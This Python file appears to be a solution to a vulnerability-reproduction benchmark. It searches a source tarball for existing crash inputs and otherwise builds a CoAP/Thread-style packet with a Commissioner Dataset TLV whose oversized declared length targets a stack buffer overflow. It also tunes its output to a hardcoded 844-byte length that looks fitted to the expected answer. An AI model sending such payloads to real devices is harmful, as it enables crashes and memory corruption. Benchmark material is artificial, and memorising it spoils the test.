import tarfile
import re
from typing import Optional, List


class Solution:
    PREFERRED_LEN = 844

    TEXT_EXTS = (
        '.c', '.h', '.cpp', '.cc', '.cxx', '.hh', '.hpp',
        '.txt', '.md', '.py', '.sh', '.java', '.js', '.rs',
        '.go', '.json', '.xml', '.html', '.htm', '.yml',
        '.yaml', '.toml', '.ini', '.cfg', '.cmake', 'makefile',
        '.mk', '.bazel', '.bzl',
    )

    INTERESTING_KEYWORDS = (
        'poc', 'crash', 'overflow', 'commission', 'dataset', 'tlv', 'input', 'bug'
    )

    HEX_ESCAPE_RE = re.compile(r'(?:\\x[0-9A-Fa-f]{2}){8,}')
    ARRAY_RE = re.compile(r'\{([^{}]{32,}?)\}', re.DOTALL)
    TOKEN_RE = re.compile(r'0[xX][0-9A-Fa-f]{1,2}|\b\d{1,3}\b')

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                members = [m for m in tar.getmembers() if m.isfile()]

                poc = self._find_binary_poc(tar, members)
                if poc is not None:
                    return poc

                poc = self._find_textual_poc(tar, members)
                if poc is not None:
                    return poc
        except Exception:
            pass

        return self._fallback_poc()

    # ---------- Utilities ----------

    def _is_probably_binary(self, data: bytes) -> bool:
        if not data:
            return False
        sample = data[:2048]
        nontext = 0
        for b in sample:
            if b in (9, 10, 13, 8, 12):  # whitespace / control commonly in text
                continue
            if 32 <= b <= 126:
                continue
            nontext += 1
        return nontext > len(sample) * 0.3

    def _name_looks_textual(self, name_lower: str) -> bool:
        for ext in self.TEXT_EXTS:
            if name_lower.endswith(ext):
                return True
        return False

    def _has_interesting_keyword(self, text: str) -> bool:
        tl = text.lower()
        return any(k in tl for k in self.INTERESTING_KEYWORDS)

    def _score_length(self, length: int) -> int:
        if length <= 0:
            return -10**9
        if length == self.PREFERRED_LEN:
            return 100
        diff = abs(length - self.PREFERRED_LEN)
        return max(0, 50 - diff)

    # ---------- Binary PoC detection ----------

    def _find_binary_poc(self, tar: tarfile.TarFile, members: List[tarfile.TarInfo]) -> Optional[bytes]:
        best_candidate: Optional[bytes] = None
        best_score = -1
        for m in members:
            size = m.size
            if size <= 0 or size > 4096:
                continue
            name_lower = m.name.lower()

            if self._name_looks_textual(name_lower):
                continue

            try:
                f = tar.extractfile(m)
                if not f:
                    continue
                data = f.read()
            except Exception:
                continue

            if not data:
                continue
            if not self._is_probably_binary(data):
                continue

            score = self._score_length(size)
            if self._has_interesting_keyword(name_lower):
                score += 30

            if score > best_score:
                best_score = score
                best_candidate = data

        return best_candidate

    # ---------- Textual PoC detection ----------

    def _find_textual_poc(self, tar: tarfile.TarFile, members: List[tarfile.TarInfo]) -> Optional[bytes]:
        best_bytes: Optional[bytes] = None
        best_score = -1

        for m in members:
            size = m.size
            if size <= 0 or size > 1024 * 1024:
                continue
            name_lower = m.name.lower()
            if not self._name_looks_textual(name_lower):
                continue

            try:
                f = tar.extractfile(m)
                if not f:
                    continue
                raw = f.read()
            except Exception:
                continue
            if not raw:
                continue

            try:
                text = raw.decode('utf-8', errors='ignore')
            except Exception:
                continue

            file_has_keyword = self._has_interesting_keyword(name_lower) or self._has_interesting_keyword(text[:512])

            # 1) Python/C-style hex escape strings
            for match in self.HEX_ESCAPE_RE.finditer(text):
                segment = match.group(0)
                hexes = re.findall(r'\\x([0-9A-Fa-f]{2})', segment)
                if len(hexes) < 16:
                    continue
                try:
                    arr = bytes(int(h, 16) for h in hexes)
                except ValueError:
                    continue
                score = self._score_length(len(arr))
                context = text[max(0, match.start() - 120): match.end() + 120]
                if self._has_interesting_keyword(context):
                    score += 40
                if file_has_keyword:
                    score += 20
                if score > best_score:
                    best_score = score
                    best_bytes = arr

            # 2) C-style integer arrays
            for match in self.ARRAY_RE.finditer(text):
                body = match.group(1)
                tokens = self.TOKEN_RE.findall(body)
                if len(tokens) < 32:
                    continue
                vals = []
                bad = False
                for t in tokens:
                    try:
                        if t.lower().startswith('0x'):
                            v = int(t, 16)
                        else:
                            v = int(t, 10)
                    except ValueError:
                        bad = True
                        break
                    if v < 0 or v > 255:
                        bad = True
                        break
                    vals.append(v)
                if bad or not vals:
                    continue
                arr = bytes(vals)
                score = self._score_length(len(arr))
                context = text[max(0, match.start() - 120): match.end() + 120]
                if self._has_interesting_keyword(context):
                    score += 40
                if file_has_keyword:
                    score += 20
                if score > best_score:
                    best_score = score
                    best_bytes = arr

        return best_bytes

    # ---------- Fallback PoC generator ----------

    def _fallback_poc(self) -> bytes:
        # Construct a generic TLV-like payload with an intentionally oversized extended length.
        # This is a best-effort generic PoC for stack-buffer overflows in TLV handlers.
        buf = bytearray()

        # Some generic header bytes that often appear in CoAP/Thread messages, but largely arbitrary.
        # Version/type/token length (CoAP-like), code, message ID:
        buf.extend(b'\x40')        # Ver=1, Type=CON, TKL=0
        buf.extend(b'\x02')        # Code: POST
        buf.extend(b'\x12\x34')    # Message ID

        # No token, minimal options placeholder (non-critical, may be ignored by harness/parser).
        # Add a dummy Uri-Path option-like sequence (not strictly valid everywhere, but harmless).
        buf.extend(b'\xb2co')      # pretend option delta/len with "co"
        buf.extend(b'\x6d\x6d')    # "mm"
        buf.extend(b'\x69\x73')    # "is"
        buf.extend(b'\x73\x65')    # "se"
        buf.extend(b'\x74')        # "t"

        # Payload marker indicating start of payload.
        buf.extend(b'\xff')

        # Now craft a Commissioner Dataset TLV with extended length.
        # Type value 0x01 is arbitrary but commonly small; actual type is parser-specific.
        # Format: [Type][Length][ExtLenHi][ExtLenLo][Value...]
        buf.extend(b'\x01')        # TLV Type: pretend "Commissioner Dataset"

        # Extended length indicator: use 0xff then a large length in the next 2 bytes.
        buf.extend(b'\xff')        # Signals extended length in many TLV schemes

        # Use a clearly oversized length (e.g., 0x0400 = 1024) to overflow a 256-byte stack buffer.
        buf.extend(b'\x04\x00')    # Extended length = 1024

        # TLV value bytes: fill with pattern. We don't need to actually reach 1024 here; the bug
        # typically stems from trusting the declared length when copying into a fixed-size buffer.
        pattern = (b'OVERFLOW!' * 128)  # 1024 bytes pattern if fully used

        # Append as much pattern as fits while keeping overall PoC size near preferred length.
        remaining = self.PREFERRED_LEN - len(buf)
        if remaining < 0:
            remaining = 0
        if remaining > len(pattern):
            remaining = len(pattern)
        buf.extend(pattern[:remaining])

        # If still shorter than preferred length, pad with 'A'
        if len(buf) < self.PREFERRED_LEN:
            buf.extend(b'A' * (self.PREFERRED_LEN - len(buf)))

        return bytes(buf[:self.PREFERRED_LEN])